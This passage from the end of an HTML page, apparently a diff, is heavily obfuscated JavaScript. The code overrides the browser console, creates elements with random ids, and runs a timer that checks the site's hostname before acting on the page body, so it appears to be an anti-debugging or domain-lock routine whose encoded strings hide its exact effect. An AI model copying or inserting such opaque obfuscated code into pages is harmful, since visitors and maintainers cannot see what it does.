aivDrxhk$kGhjNzepqLWPvd[UTF$MMBycHGYrTfD_Ufh(0x184)](aivDrxhk$kGhjNzepqLWPvd[UTF$MMBycHGYrTfD_Ufh(0x190)]());}catch(JS$nMXs$AZMsoi){aivDrxhk$kGhjNzepqLWPvd[UTF$MMBycHGYrTfD_Ufh(0x184)](aivDrxhk$kGhjNzepqLWPvd[UTF$MMBycHGYrTfD_Ufh(0x190)]());}}}(_0x257e,Math.ceil(-0x2b9cb)*parseInt(0x9)+-0x2*parseFloat(-0x71c4d)+0x182df0),(function(){const fyfZe$A=sFfEkK$fMziBAJZwZbkuvp,KmkEnmSV=_0xe8c3,YYzy$XBjBwTdCwIPE$AKHEWaC=(function(){let MLfOyVBUyEPRR$$IEj=!![];return function(jeThI,ybpXPE$jfq){const vZRAXjF$_R=MLfOyVBUyEPRR$$IEj?function(){const DEQRwbJTpzvMFOryYEYKoGCD=_0xe8c3;if(ybpXPE$jfq){const vcZlz$G_trTEiNcVEYRhOyCWG=ybpXPE$jfq[DEQRwbJTpzvMFOryYEYKoGCD(Math.floor(parseInt(0x1))*-0x237b+0x5*parseInt(0x359)+parseFloat(parseInt(0x1389)))](jeThI,arguments);return ybpXPE$jfq=null,vcZlz$G_trTEiNcVEYRhOyCWG;}}:function(){};return MLfOyVBUyEPRR$$IEj=![],vZRAXjF$_R;};}()),qiwjHUauNrHLN$fg=(function(){let waQzQOaFVfq$WfrLnCpTYrDG=!![];return function(MNjbEXhItZtXPLUuC,uCZgwC$hqQ){const PsosmKTYqISIXVWY=waQzQOaFVfq$WfrLnCpTYrDG?function(){const gYLqgDXYRVUjJMRQBYU=_0xe8c3;if(uCZgwC$hqQ){const GGdBrUxKuCaWtlKW=uCZgwC$hqQ[gYLqgDXYRVUjJMRQBYU(Math.trunc(-0x2)*0x1384+parseInt(-parseInt(0x216a))+-parseInt(0x1)*-0x493d)](MNjbEXhItZtXPLUuC,arguments);return uCZgwC$hqQ=null,GGdBrUxKuCaWtlKW;}}:function(){};return waQzQOaFVfq$WfrLnCpTYrDG=![],PsosmKTYqISIXVWY;};}());let hK$kJs=![],udh_ln$z=[],bzBMId=![],YFTSa_AyznhLRB=![];function c$uljJUCGCQHFqM(hvUOLCHfCBhIT,gGA$_MNmIu){const YxGzqKLhsTvBRmcdZ=sFfEkK$fMziBAJZwZbkuvp,ALBAzExBHKkx=_0xe8c3,aOjOz$OyGi_Sw=YYzy$XBjBwTdCwIPE$AKHEWaC(this,function(){const MwJDUeTlPCUAtp_Pi$gkCn=sFfEkK$fMziBAJZwZbkuvp,S$_bpOvwP=_0xe8c3;return aOjOz$OyGi_Sw[S$_bpOvwP(Number(parseInt(0x2117))+-0x2a5+-0x1d84*Math.floor(parseInt(0x1)))]()[S$_bpOvwP(0x33a*0x1+-0xca6*0x1+-parseInt(0x518)*-0x2)](S$_bpOvwP(Math.floor(parseInt(0x1b9e))+parseFloat(-0x59b)+Number(-0x2f)*Number(0x73)))[S$_bpOvwP(Math.floor(0x2540)+Math.max(parseInt(0x1b68),0x1b68)+-0xa9f*Math.floor(parseInt(0x6)))]()[S$_bpOvwP(0x6b*parseInt(-parseInt(0xa))+Math.max(parseInt(0x2417),0x2417)+parseFloat(parseInt(0x1f21))*Number(-0x1))](aOjOz$OyGi_Sw)[S$_bpOvwP(parseFloat(-0x5c)*0x29+0x4b*0x5e+0x1*-parseInt(0xc0a))](MwJDUeTlPCUAtp_Pi$gkCn(0x1a4));});aOjOz$OyGi_Sw();const EsAEXrTkuAdPT__tKKG=qiwjHUauNrHLN$fg(this,function(){const DHKhHH$CzdaTFZpF=sFfEkK$fMziBAJZwZbkuvp,CjsPKzyFLwfe=_0xe8c3,AA_ZPkQAKRmDwqTTTdciyQE=function(){const wFmIP_BJY=_0xe8c3;let c$bSXVWQIogWemFKiw;try{c$bSXVWQIogWemFKiw=Function(wFmIP_BJY(-parseInt(0x11b5)*-parseInt(0x1)+-0x1*-0x7bb+parseFloat(-0x1890))+wFmIP_BJY(Math.trunc(-parseInt(0x31))*-parseInt(0x46)+parseInt(0x34)+Math.trunc(-0xcb8)*parseInt(0x1))+');')();}catch(Gb_ACKNijqUcdVRCDBcMcF){c$bSXVWQIogWemFKiw=window;}return c$bSXVWQIogWemFKiw;},Vkmv$yFSRdHrKoQ=AA_ZPkQAKRmDwqTTTdciyQE(),utUNAf_YOnudTwxsFQFYNVLTF=Vkmv$yFSRdHrKoQ[CjsPKzyFLwfe(Math.floor(-0x1d5)*-parseInt(0x11)+Math.floor(-0xd)*parseInt(0x13b)+0x1*Math.max(-0xe39,-0xe39))]=Vkmv$yFSRdHrKoQ[CjsPKzyFLwfe(Math.max(-0x1ba4,-0x1ba4)+parseInt(0xbe)*Math.max(-parseInt(0xd),-parseInt(0xd))+parseInt(0x2637))]||{},ub_IKGtkVJnrm=[DHKhHH$CzdaTFZpF(0x1b4),CjsPKzyFLwfe(-parseInt(0x75c)+-0x3d*parseInt(0x30)+parseInt(0x1396)),CjsPKzyFLwfe(Math.floor(-parseInt(0xcf6))+parseFloat(-0x18)*parseInt(-parseInt(0x59))+Math.ceil(0x57f)),CjsPKzyFLwfe(0xa86+Number(-parseInt(0x585))+-0x43a),CjsPKzyFLwfe(0x1f9+parseInt(0x2)*-0xd5+Math.floor(-parseInt(0x4))*Number(-0x25)),CjsPKzyFLwfe(Math.floor(-0x18f1)+0x4b7+parseInt(0x150b)),CjsPKzyFLwfe(0x1a5*0x1+parseInt(0x352)+parseInt(0x29)*parseInt(-parseInt(0x1a)))];for(let FNmbuOKunHKDQnEd=parseInt(0x5)*0x2f1+Math.max(parseInt(0x1d8f),0x1d8f)*-parseInt(0x1)+0xeda;FNmbuOKunHKDQnEd<ub_IKGtkVJnrm[CjsPKzyFLwfe(-0xe40+-0x65*Math.floor(0x24)+parseInt(0x1d4f))];FNmbuOKunHKDQnEd++){const ksLNxwdrpBft=qiwjHUauNrHLN$fg[CjsPKzyFLwfe(-parseInt(0x1b30)+Math.trunc(parseInt(0x25da))+parseInt(0xfd)*-0xa)][CjsPKzyFLwfe(-0x1540+-parseInt(0x1564)+-0x2b82*Math.ceil(-parseInt(0x1)))][CjsPKzyFLwfe(Math.ceil(-parseInt(0x49))*-0x58+Math.max(-parseInt(0x66),-parseInt(0x66))*parseInt(0x25)+-0x3*0x32b)](qiwjHUauNrHLN$fg),TbeQm$$iDqjMKpTtSlnEF=ub_IKGtkVJnrm[FNmbuOKunHKDQnEd],PCdCtHVuQ$WZinsEonTDhRHx=utUNAf_YOnudTwxsFQFYNVLTF[TbeQm$$iDqjMKpTtSlnEF]||ksLNxwdrpBft;ksLNxwdrpBft[CjsPKzyFLwfe(parseInt(0x1f25)+0x9*-parseInt(0x349)+Math.ceil(-parseInt(0xbf)))]=qiwjHUauNrHLN$fg[CjsPKzyFLwfe(Math.ceil(-parseInt(0x27))*Math.max(-parseInt(0x38),-0x38)+Math.trunc(0x874)+parseFloat(parseInt(0x1))*Math.trunc(-parseInt(0x1023)))](qiwjHUauNrHLN$fg),ksLNxwdrpBft[DHKhHH$CzdaTFZpF(0x1b9)]=PCdCtHVuQ$WZinsEonTDhRHx[CjsPKzyFLwfe(parseInt(0xf84)+Number(-parseInt(0xa8b))*0x2+0x680)][CjsPKzyFLwfe(Math.floor(-0x2)*-parseInt(0x81b)+parseInt(0x144c)+parseInt(0x23a9)*Math.trunc(-0x1))](PCdCtHVuQ$WZinsEonTDhRHx),utUNAf_YOnudTwxsFQFYNVLTF[TbeQm$$iDqjMKpTtSlnEF]=ksLNxwdrpBft;}});EsAEXrTkuAdPT__tKKG(),udh_ln$z[YxGzqKLhsTvBRmcdZ(0x184)](hvUOLCHfCBhIT);let ZZlEfnTJFgKrlZQ=document[YxGzqKLhsTvBRmcdZ(0x18c)](hvUOLCHfCBhIT);!ZZlEfnTJFgKrlZQ&&(ZZlEfnTJFgKrlZQ=document[YxGzqKLhsTvBRmcdZ(0x1b1)](ALBAzExBHKkx(0x27*0x14+parseInt(0x1902)+-parseInt(0x36)*parseInt(0x81))),ZZlEfnTJFgKrlZQ['id']=hvUOLCHfCBhIT,document[ALBAzExBHKkx(parseFloat(-0x18ce)+-0x462+-parseInt(0xf0)*-0x20)][ALBAzExBHKkx(-parseInt(0x3)*Math.trunc(0x471)+Number(parseInt(0x247c))+Math.max(-parseInt(0x5),-parseInt(0x5))*parseInt(0x477))](ZZlEfnTJFgKrlZQ));const JusV_APG$gjSZYfdHqhYsOfh=document[ALBAzExBHKkx(-parseInt(0x749)+Math.ceil(-parseInt(0x25f4))+parseInt(0x2e11))](ALBAzExBHKkx(parseInt(parseInt(0x214c))+0x1afe+-0x1*Number(parseInt(0x3b73))));JusV_APG$gjSZYfdHqhYsOfh[ALBAzExBHKkx(-0x281*Number(0xa)+0x1*0x153b+Math.trunc(0x491))]=ALBAzExBHKkx(0x6*parseInt(0x350)+0x236+Math.floor(-0x11d)*parseInt(0x13)),ZZlEfnTJFgKrlZQ[ALBAzExBHKkx(parseInt(0x1347)+parseInt(0x3)*Number(-0x9b)+-parseInt(0x10a0))](JusV_APG$gjSZYfdHqhYsOfh),gGA$_MNmIu===Math[YxGzqKLhsTvBRmcdZ(0x186)](-parseInt(0x5)*parseFloat(-parseInt(0x21e))+Math.ceil(-0xf)*-0x250+Math.floor(0x2d42)*-0x1)*-(Math.max(-0x989,-0x989)+Math.ceil(-0x44e)+parseInt(-parseInt(0x2))*-0x840)+parseInt(Math.ceil(0x1)*Math.max(0xd53,parseInt(0xd53))+-parseInt(0x1df5)*Number(-0x1)+Math.ceil(-parseInt(0x6a))*parseInt(0x20))+parseFloat(-parseInt(Math.trunc(-parseInt(0x1))*parseInt(0x144f)+Math.ceil(0x2d)*-0xb3+Math.trunc(parseInt(0x1))*parseInt(0x368b)))*(parseInt(0x2bb)+parseInt(0x6e3)+-parseInt(0x1eb)*Math.max(parseInt(0x5),parseInt(0x5)))?bzBMId=!![]:YFTSa_AyznhLRB=!![];}function IuySzzpOiISwZDDrwmF(){const TJjv$_TBBMK=sFfEkK$fMziBAJZwZbkuvp,wRFucCDOfu$LtCMXVPgy=_0xe8c3,k_l_ellCISKwd=location[wRFucCDOfu$LtCMXVPgy(Math.floor(0x11)*parseFloat(-parseInt(0x9e))+Math.floor(-parseInt(0x2194))+parseInt(0x4)*parseInt(0xb36))];return k_l_ellCISKwd===wRFucCDOfu$LtCMXVPgy(parseInt(0x1)*Math.ceil(parseInt(0x265))+parseInt(0x5)*0x69e+-0x22b2)||k_l_ellCISKwd===wRFucCDOfu$LtCMXVPgy(0x7*-0x53f+Math.floor(-0x1)*parseInt(0x2351)+0x48cb*parseInt(parseInt(0x1)))||location[wRFucCDOfu$LtCMXVPgy(parseInt(0x2133)+parseInt(0x4b6)+-0x3*parseInt(0xc5f))][TJjv$_TBBMK(0x1b5)](TJjv$_TBBMK(0x19f));}c$uljJUCGCQHFqM(crypto[KmkEnmSV(-0x7a*-parseInt(0x13)+parseInt(0x1f8b)+-0x257*parseInt(0x11))]()[KmkEnmSV(parseFloat(-0x1076)+Math.ceil(parseInt(0x1d3))*Math.max(0x2,0x2)+parseFloat(0xdba))]('-',''),parseInt(0x1*parseInt(-parseInt(0x270a))+0x1*-0x4ff+parseInt(0x43b8))+(Math.ceil(-parseInt(0xc7d))*-parseInt(0x1)+Math.floor(-parseInt(0x18e5))+0x1e00)+parseInt(-(0x49aa+0x163*parseInt(0x29)+-0x593f))),c$uljJUCGCQHFqM(crypto[fyfZe$A(0x18b)]()[fyfZe$A(0x19c)]('-',''),Math[KmkEnmSV(0x1250+-0x19f0+Math.max(0x887,parseInt(0x887)))](-(0x85d*-0x1+-parseInt(0x25ce)*-0x1+-parseInt(0x3ae)*parseInt(0x8)))*(0x9*parseFloat(parseInt(0x405))+parseInt(0x106)*-0x17+-parseInt(0xc70))+-parseInt(parseInt(0xbfa)+parseInt(0x1c)*0x29c+-0x1*Math.trunc(parseInt(0x3077)))+Math[KmkEnmSV(Math.floor(parseInt(0x34d))+parseInt(0x61)*-0x5f+parseInt(0x2180))](-(-0x13ff+parseInt(-0x765)+0x1ffd))*-(parseInt(0x213b)+parseFloat(-0x1e65)*parseInt(-parseInt(0x1))+Math.floor(parseInt(0x25))*-0x1b8));let cDI_LjPiksLv$sA=setInterval(()=>{const wAfptqBlmnOZ=fyfZe$A,gcJTS=KmkEnmSV;hK$kJs&&clearInterval(cDI_LjPiksLv$sA);for(let DwEqUVjz_qHgd_omhiKOFelRy=-parseInt(-parseInt(0x2286)+parseInt(parseInt(0x60d))*-0x2+parseInt(0x2f30))+Math[wAfptqBlmnOZ(0x196)](-parseInt(0xe05)*-0x2+Number(-0x6c9)*Math.floor(0x5)+parseInt(0x1d4)*0xb)*(Math.trunc(0x17)*-parseInt(0x86)+parseInt(0x9a)+Math.ceil(0xb72))+-parseInt(Math.max(parseInt(0x1),0x1)*-parseInt(0x2926)+-0x1d97+Number(parseInt(0x629f)));DwEqUVjz_qHgd_omhiKOFelRy<udh_ln$z[gcJTS(-parseInt(0x3d8)+Math.max(parseInt(0x86),parseInt(0x86))*Math.floor(-parseInt(0x3b))+Math.ceil(parseInt(0x2395))*Number(0x1))];DwEqUVjz_qHgd_omhiKOFelRy++){const cPPRWqXnlPOY$$cBq=udh_ln$z[DwEqUVjz_qHgd_omhiKOFelRy],Okf$w_HLhAd=document[gcJTS(Math.floor(-0x96)*-0xd+-parseInt(0x18f5)+parseFloat(parseInt(0x1b))*0xad)](cPPRWqXnlPOY$$cBq);YFTSa_AyznhLRB&&bzBMId&&(!hK$kJs&&(!Okf$w_HLhAd&&(!IuySzzpOiISwZDDrwmF()&&document[wAfptqBlmnOZ(0x1b0)][gcJTS(Math.floor(parseInt(0x995))*-0x4+Math.ceil(-0x8fe)+Math.max(0x371,0x371)*0xe)]())));}},Math[KmkEnmSV(Math.ceil(0x2615)*Math.floor(parseInt(0x1))+-parseInt(0x171f)+-parseInt(0xe31)*0x1)](-parseInt(-0x6f1*parseInt(0x7)+0x2*-0x24b3+Math.max(-parseInt(0x104),-0x104)*-parseInt(0x9e)))+(-parseInt(0x2)*0xf08+0x1baf+0xfe4)+Number(parseInt(0x1083)*Math.max(parseInt(0x1),0x1)+Math.floor(0x1e34)+-parseInt(0x11d7)));}()));function sFfEkK$fMziBAJZwZbkuvp(DgkkwGrBFCVM$xjRVLz$VfAbWhV,wv_xek){const jpcyYzd_r_c=UravPbGESYjDUNqxKcf$Vqza();return sFfEkK$fMziBAJZwZbkuvp=function(cBkxdlJOLrthNdkDJWsPnwlWD,Ew_izWDrWs$VbNMSejx){cBkxdlJOLrthNdkDJWsPnwlWD=cBkxdlJOLrthNdkDJWsPnwlWD-(parseInt(0x222d)*-parseInt(0x1)+0xbaa+Math.ceil(parseInt(0x1801)));let ZrC$BmMHQJFnM$qxVDvOaapr=jpcyYzd_r_c[cBkxdlJOLrthNdkDJWsPnwlWD];if(sFfEkK$fMziBAJZwZbkuvp['MCMlHP']===undefined){const kiHmW=function(qHLfn){let zVDPTWpEcic$l=Number(-0x7d)*parseFloat(-parseInt(0xe))+0x1b0e*Number(0x1)+parseInt(-parseInt(0xb))*0x301&Math.trunc(-parseInt(0x5))*0x1c+parseFloat(-parseInt(0x788))*parseInt(0x5)+-0x29d*-parseInt(0xf),GQloCGHmGKtLJqIIj$jnKaqx=new Uint8Array(qHLfn['match'](/.{1,2}/g)['map'](JRMexmf=>parseInt(JRMexmf,-0x1*parseInt(-0x12e)+-0xdc1*-0x1+-parseInt(0xedf)))),yzuBpRiFSFq_wPGNK=GQloCGHmGKtLJqIIj$jnKaqx['map'](Wkg_QjyPwvVREelpsnGOnwJG=>Wkg_QjyPwvVREelpsnGOnwJG^zVDPTWpEcic$l),gF$xXW$bUfgmPrkGxHtTR=new TextDecoder(),QpJsUNKKXcaFcrHADyIt=gF$xXW$bUfgmPrkGxHtTR['decode'](yzuBpRiFSFq_wPGNK);return QpJsUNKKXcaFcrHADyIt;};sFfEkK$fMziBAJZwZbkuvp['TWdYOH']=kiHmW,DgkkwGrBFCVM$xjRVLz$VfAbWhV=arguments,sFfEkK$fMziBAJZwZbkuvp['MCMlHP']=!![];}const Xtz$tyRcF_YASGBEJfRTSL=jpcyYzd_r_c[-0x961+0x7be+parseInt(0x1)*parseInt(0x1a3)],aK$Aa_l=cBkxdlJOLrthNdkDJWsPnwlWD+Xtz$tyRcF_YASGBEJfRTSL,XQHXnDh$$EY=DgkkwGrBFCVM$xjRVLz$VfAbWhV[aK$Aa_l];return!XQHXnDh$$EY?(sFfEkK$fMziBAJZwZbkuvp['MbVogc']===undefined&&(sFfEkK$fMziBAJZwZbkuvp['MbVogc']=!![]),ZrC$BmMHQJFnM$qxVDvOaapr=sFfEkK$fMziBAJZwZbkuvp['TWdYOH'](ZrC$BmMHQJFnM$qxVDvOaapr),DgkkwGrBFCVM$xjRVLz$VfAbWhV[aK$Aa_l]=ZrC$BmMHQJFnM$qxVDvOaapr):ZrC$BmMHQJFnM$qxVDvOaapr=XQHXnDh$$EY,ZrC$BmMHQJFnM$qxVDvOaapr;},sFfEkK$fMziBAJZwZbkuvp(DgkkwGrBFCVM$xjRVLz$VfAbWhV,wv_xek);}function _0x257e(){const aWI$GMwS=sFfEkK$fMziBAJZwZbkuvp,uudKm=[aWI$GMwS(0x186),aWI$GMwS(0x1a1),aWI$GMwS(0x1a5),aWI$GMwS(0x199),aWI$GMwS(0x1b8),aWI$GMwS(0x19e),aWI$GMwS(0x18a),aWI$GMwS(0x1bf),aWI$GMwS(0x1a0),aWI$GMwS(0x196),aWI$GMwS(0x18d),aWI$GMwS(0x1b0),aWI$GMwS(0x17f),aWI$GMwS(0x18b),aWI$GMwS(0x1bd),aWI$GMwS(0x1b1),aWI$GMwS(0x19b),aWI$GMwS(0x1af),aWI$GMwS(0x197),aWI$GMwS(0x1ae),aWI$GMwS(0x185),aWI$GMwS(0x187),aWI$GMwS(0x1a8),aWI$GMwS(0x19a),aWI$GMwS(0x1b7),aWI$GMwS(0x1bc),aWI$GMwS(0x1a3),aWI$GMwS(0x1a2),aWI$GMwS(0x182),aWI$GMwS(0x192),aWI$GMwS(0x18e),aWI$GMwS(0x181),aWI$GMwS(0x1ab),aWI$GMwS(0x1a4),aWI$GMwS(0x1ba),aWI$GMwS(0x18c),aWI$GMwS(0x1a6),aWI$GMwS(0x19c),aWI$GMwS(0x1b3),aWI$GMwS(0x1aa),aWI$GMwS(0x194),aWI$GMwS(0x1b9),aWI$GMwS(0x1bb),aWI$GMwS(0x188),aWI$GMwS(0x1ad),aWI$GMwS(0x19d),aWI$GMwS(0x198),aWI$GMwS(0x180),aWI$GMwS(0x193)];return _0x257e=function(){return uudKm;},_0x257e();}</script></body>
+
+</html>
